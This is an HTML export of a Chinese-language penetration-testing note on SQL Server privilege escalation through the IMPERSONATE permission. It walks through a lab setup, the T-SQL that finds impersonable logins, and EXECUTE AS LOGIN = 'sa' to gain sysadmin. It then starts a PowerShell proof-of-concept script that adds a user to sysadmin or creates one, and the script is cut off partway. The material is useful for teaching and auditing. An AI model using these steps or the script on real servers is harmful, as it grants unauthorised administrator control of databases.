<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="mssql-模拟登录提权"><span class="csDE05BCC">Mssql </span><span class="csECDA2D3">模拟登录提权</span></a></h1>
		<h2 class="cs868C439D">
			<a name="Xb05c28b5749b78a2d8624859281cf6197e741f7"><span class="csB2D98684">0x01 </span><span class="cs83F14626">前提</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">开发者有时为了满足某种需求，允许其他登录用户模拟高权限的用户，对于开发来说，一个再简单不过的功能。虽然严格意义上这不算个漏洞，但是这种配置不当一般可以用来提权。</span></p><h2 class="cs868C439D">
			<a name="Xd60908b21f7273a8264a7c27eff2a88b6374bda"><span class="csB2D98684">0x02 </span><span class="cs83F14626">复现</span></a></h2>
		<h4 class="cs868C439D">
			<a name="Xf32e7417d1bb0c5076004fc815861e9b2873a22"><span class="csBF12A472">1.sa</span><span class="cs6EDCDAE2">用户登录创建</span><span class="csBF12A472">4</span><span class="cs6EDCDAE2">个用户</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">-- Create login 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">CREATE LOGIN MyUser1 WITH PASSWORD = &#39;MyPassword!&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">-- Create login 2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">CREATE LOGIN MyUser2 WITH PASSWORD = &#39;MyPassword!&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">-- Create login 3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">CREATE LOGIN MyUser3 WITH PASSWORD = &#39;MyPassword!&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">-- Create login 4</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">CREATE LOGIN MyUser4 WITH PASSWORD = &#39;MyPassword!&#39;;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e6%a8%a1%e6%8b%9f%e7%99%bb%e5%bd%95%e6%8f%90%e6%9d%83_files/image0.png" width="560" height="392" alt="" style="border-width:0px;" /></span></p><h4 class="cs868C439D">
			<a name="Xd8e4dc5fae9868aab3e8843c46ad65a4e734305"><span class="csBF12A472">2.</span><span class="cs6EDCDAE2">赋予用户</span><span class="csBF12A472">MyUser1</span><span class="cs6EDCDAE2">权限来模拟</span><span class="csBF12A472"> MyUser2, MyUser3,</span><span class="cs6EDCDAE2">及</span><span class="csBF12A472">sa</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">USE master;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">GRANT IMPERSONATE ON LOGIN::sa to [MyUser1];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">GRANT IMPERSONATE ON LOGIN::MyUser2 to [MyUser1];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">GRANT IMPERSONATE ON LOGIN::MyUser3 to [MyUser1];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">GO</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e6%a8%a1%e6%8b%9f%e7%99%bb%e5%bd%95%e6%8f%90%e6%9d%83_files/image1.png" width="560" height="282" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里的</span><span class="cs8926E06">GRANT IMPERSONATE ON LOGIN</span><span class="cs9C1B1871">意思是授权</span><span class="cs8926E06">MyUser1</span><span class="cs9C1B1871">用户对</span><span class="cs8926E06">sa,MyUser2,MyUser3</span><span class="cs9C1B1871">用户登录权限，</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">查看</span><span class="cs8926E06">sqlserver</span><span class="cs9C1B1871">的文档</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">https://docs.microsoft.com/zh-cn/sql/t-sql/statements/grant-server-principal-permissions-transact-sql?view=sql-server-ver15</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e6%a8%a1%e6%8b%9f%e7%99%bb%e5%bd%95%e6%8f%90%e6%9d%83_files/image2.png" width="560" height="185" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">SQL Server</span><span class="cs9C1B1871">的安全模型中，模拟（</span><span class="cs8926E06">IMPERSONATE </span><span class="cs9C1B1871">）权限的安全对象是</span><span class="cs8926E06">User</span><span class="cs9C1B1871">或</span><span class="cs8926E06">Login</span><span class="cs9C1B1871">，被授予者（</span><span class="cs8926E06">Grantee </span><span class="cs9C1B1871">）有权限模拟指定用户，在其安全上下文执行特定的操作。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">例如，</span><span class="cs8926E06">user1</span><span class="cs9C1B1871">授予模拟</span><span class="cs8926E06">user2</span><span class="cs9C1B1871">的权限，当</span><span class="cs8926E06">user2</span><span class="cs9C1B1871">的安全上下文有足够的权限，而</span><span class="cs8926E06">user1</span><span class="cs9C1B1871">没有时，通过权限模拟，</span><span class="cs8926E06">user1</span><span class="cs9C1B1871">能够在</span><span class="cs8926E06">user2</span><span class="cs9C1B1871">的权限上下文中执行查询请求：</span></p><p class="cs3A447A38"><span class="cs9FB05234">GRANT IMPERSONATE ON USER:: user2 TO user1;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过执行</span><span class="cs8926E06">EXECUTE AS </span><span class="cs9C1B1871">命令模拟用户的权限，用户</span><span class="cs8926E06">user1</span><span class="cs9C1B1871">就运行在</span><span class="cs8926E06">user2</span><span class="cs9C1B1871">的安全上下文中，例如，</span><span class="cs8926E06">user1</span><span class="cs9C1B1871">在登陆数据库之后，模拟</span><span class="cs8926E06">user2</span><span class="cs9C1B1871">的权限：</span></p><p class="cs3A447A38"><span class="cs9FB05234">EXECUTE AS USER = &#39;user2&#39;;</span></p><h4 class="cs868C439D">
			<a name="Xd08976ebdb45f1c22b4e2814b7edd714def0691"><span class="csBF12A472">3.</span><span class="cs6EDCDAE2">查找可以模拟登录的用户</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">默认情况下，系统管理员可以模拟任何人，但是正常登录必须分配权限来模拟特定的用户，使用</span><span class="cs8926E06">MyUser1</span><span class="cs9C1B1871">用户登录，打开新建查询，执行下面语句查询那些用户可以用来模拟登录</span></p><p class="cs3A447A38"><span class="cs9FB05234">SELECT distinct b.name</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">FROM sys.server_permissions a</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">INNER JOIN sys.server_principals b</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ON a.grantor_principal_id = b.principal_id</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">WHERE a.permission_name = &#39;IMPERSONATE&#39;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e6%a8%a1%e6%8b%9f%e7%99%bb%e5%bd%95%e6%8f%90%e6%9d%83_files/image3.png" width="560" height="405" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里我们可以看到</span><span class="cs8926E06">MyUser1</span><span class="cs9C1B1871">用户可以模拟登录</span><span class="cs8926E06">sa,MyUser2,MyUser2</span><span class="cs9C1B1871">用户，接下来就是模拟登录</span><span class="cs8926E06">sa</span><span class="cs9C1B1871">来获取</span><span class="cs8926E06">sysadmin</span><span class="cs9C1B1871">权限了</span></p><h4 class="cs868C439D">
			<a name="Xab33d7e0482b536f018c1ab57381e1e9f5a948a"><span class="csBF12A472">4.</span><span class="cs6EDCDAE2">模拟</span><span class="csBF12A472">SQL Server</span><span class="cs6EDCDAE2">用户登陆</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">-- </span><span class="cs7FFD2630">验证是否为</span><span class="cs9FB05234">sysadmin</span><span class="cs7FFD2630">权限</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">SELECT SYSTEM_USER</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">-- </span><span class="cs7FFD2630">模拟</span><span class="cs9FB05234">sa</span><span class="cs7FFD2630">登录</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">EXECUTE AS LOGIN = &#39;sa&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">-- </span><span class="cs7FFD2630">验证是否为</span><span class="cs9FB05234">sysadmin</span><span class="cs7FFD2630">权限</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">SELECT SYSTEM_USER</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e6%a8%a1%e6%8b%9f%e7%99%bb%e5%bd%95%e6%8f%90%e6%9d%83_files/image4.png" width="560" height="395" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到，第二个查询之后我们已经是</span><span class="cs8926E06">sysadmin</span><span class="cs9C1B1871">的权限了</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我们再用查看登录用户来验证下</span></p><p class="cs3A447A38"><span class="cs9FB05234">SELECT * FROM master.sys.sysusers</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">WHERE islogin = 1</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">模拟</span><span class="cs8926E06">sa</span><span class="cs9C1B1871">登录之前</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e6%a8%a1%e6%8b%9f%e7%99%bb%e5%bd%95%e6%8f%90%e6%9d%83_files/image5.png" width="560" height="372" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">模拟</span><span class="cs8926E06">sa</span><span class="cs9C1B1871">登录之后</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e6%a8%a1%e6%8b%9f%e7%99%bb%e5%bd%95%e6%8f%90%e6%9d%83_files/image6.png" width="560" height="339" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">权限高了，可以看到更多的用户登录</span></p><h4 class="cs868C439D">
			<a name="X77bf73f019a5d67ed4aaa3447d9bc52b5ef9d3f"><span class="csBF12A472">5.</span><span class="cs6EDCDAE2">回到原来的登录</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">REVERT</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">SELECT SYSTEM_USER</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e6%a8%a1%e6%8b%9f%e7%99%bb%e5%bd%95%e6%8f%90%e6%9d%83_files/image7.png" width="560" height="535" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这样我们又回到</span><span class="cs8926E06">myuser1</span><span class="cs9C1B1871">用户登录的会话了</span></p><h2 class="cs868C439D">
			<a name="X3370bdef2858b130fa48de391b05ed59b0f9327"><span class="csB2D98684">0x03 </span><span class="cs83F14626">工具化</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">当然这个也可以用</span><span class="cs8926E06">powershell</span><span class="cs9C1B1871">一键实现</span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs6FD73CFB"><span class="cs8926E06">Invoke-SqlServer-Escalate-ExecuteAs.psm1</span></p><p class="cs3A447A38"><span class="cs9FB05234">function Invoke-SqlServer-Escalate-ExecuteAs</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;.SYNOPSIS</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;This script can be used escalate privileges if the IMPERSONATION privilege has been assigned to the user.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;.DESCRIPTION</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;This script can be used escalate privileges if the IMPERSONATION privilege has been assigned to the user.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;In most cases this results in additional data access, but in some cases it can be used to gain sysadmin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;privileges. &nbsp;This script can also be used to add a new sysadmin instead of escalating the privileges of</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;the existing user. &nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;.EXAMPLE</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Adding the current user to the syadmin role if the user has permissions to impersonate the sa account.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;PS C:\&gt; Invoke-SqlServer-Escalate-ExecuteAs -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\SQLEXPRESS</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] Attempting to Connect to SQLServer\SQLEXPRESS as myappuser...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] Connected.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] Enumerating users that myappuser can impersonate...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] 3 accounts can be impersonated:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] - user2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] - superuser</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] - sa</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] Checking if any of are sysadmins...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] - user2 - NOT sysadmin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] - superuser - NOT sysadmin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] - sa - sysadmin!</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] Attempting to add myappuser to the sysadmin role via impersonation...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] Verifying that myappuser was added to the sysadmin role...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] Success! - myappuser is now a sysadmin.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] All done.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;.EXAMPLE</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Creating a new sysadmin as a user with permissions to impersonate the sa account.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;PS C:\&gt; Invoke-SqlServer-Escalate-ExecuteAs -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\SQLEXPRESS -NewUser eviladmin -NewPass MyPassword!</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] Attempting to Connect to SQLServer\SQLEXPRESS as myappuser...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] Connected.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] Enumerating users that myappuser can impersonate...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] 3 accounts can be impersonated:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] - user2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] - superuser</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] - sa</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] Checking if any of are sysadmins...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] - user2 - NOT sysadmin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] - superuser - NOT sysadmin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] - sa - sysadmin!</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] Attempting to create and add eviladmin to the sysadmin role via impersonation...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] Verifying that eviladmin was added to the sysadmin role...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] Success! - eviladmin is now a sysadmin.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[*] All done.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;.LINK</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http://www.netspi.com</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http://msdn.microsoft.com/en-us/library/ms178640.aspx</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;.NOTES</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Author: Scott Sutherland - 2014, NetSPI</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Version: Invoke-SqlServer-Escalate-ExecuteAs.psm1 v1.0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Comments: This should work on SQL Server 2005 and Above.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;.TODO</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fix double run bug</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fix alternative creds connection use</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;#&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;[CmdletBinding()]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;Param(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[Parameter(Mandatory=$false,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;HelpMessage=&#39;Set SQL Login username.&#39;)]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[string]$SqlUser,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[Parameter(Mandatory=$false,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;HelpMessage=&#39;Set SQL Login password.&#39;)]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[string]$SqlPass,</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[Parameter(Mandatory=$false,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;HelpMessage=&#39;Set SQL Login username.&#39;)]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[string]$NewUser,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[Parameter(Mandatory=$false,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;HelpMessage=&#39;Set SQL Login password.&#39;)]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[string]$NewPass,</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[Parameter(Mandatory=$false,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;HelpMessage=&#39;Execute query under impersonated user context.&#39;)]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[string]$Query,</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[Parameter(Mandatory=$true,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;HelpMessage=&#39;Set target SQL Server instance.&#39;)]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[string]$SqlServerInstance</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# -----------------------------------------------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Setup database connection string</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# -----------------------------------------------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Create fun connection object</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$conn = New-Object System.Data.SqlClient.SqlConnection</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Set authentication type and create connection string</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if($SqlUser){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# SQL login / alternative domain credentials</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Output &quot;[*] Attempting to authenticate to $SqlServerInstance with SQL login $SqlUser...&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$conn.ConnectionString = &quot;Server=$SqlServerInstance;Database=master;User ID=$SqlUser;Password=$SqlPass;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[string]$ConnectUser = $SqlUser</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Trusted connection</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Output &quot;[*] Attempting to authenticate to $SqlServerInstance as the current Windows user...&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$conn.ConnectionString = &quot;Server=$SqlServerInstance;Database=master;Integrated Security=SSPI;&quot; &nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$UserDomain = [Environment]::UserDomainName</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$Username = [Environment]::UserName</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ConnectUser = &quot;$UserDomain\$Username&quot; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# -----------------------------------------------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Test database connection</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# -----------------------------------------------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$conn.Open()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Host &quot;[*] Connected.&quot; -foreground &quot;green&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$conn.Close()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}catch{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 